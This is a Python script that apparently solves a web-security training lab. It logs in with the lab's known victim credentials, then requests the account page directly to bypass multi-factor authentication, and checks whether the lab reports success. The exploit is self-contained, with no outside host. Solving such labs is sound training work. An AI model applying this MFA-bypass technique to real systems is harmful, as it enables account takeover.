import sys
import requests

def verify_if_lab_solved(url):

    response = requests.get(url + "/")

    if "you solved the lab!".lower() in response.text:
        print("[+] Solved the lab successfully")
    else:
        print("[!] LAB NOT SOLVED, please check manually once")

def bruteforce_username_and_pass(url):

    print()
    print(f"[*] Logging in as carlos")
    print()
    
    data = {
        "username": "carlos",
        "password": "montoya",
    }

    s = requests.Session()

    s.post(url + "/login", data=data)

    print(f"Sending request to {url}/my-account?id=carlos to bypass MFA")

    response = s.get(url + "/my-account?id=carlos")
    
    print()
    print(f"Request Method: {response.request.method}")
    print(f"Request Url: {response.request.url}")
    print(f"Request Headers: {response.request.headers}")
    print()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('[+] Usage: python file.py https://website.net')
    else:
        url = sys.argv[1].strip("/")
        bruteforce_username_and_pass(url)
        verify_if_lab_solved(url)
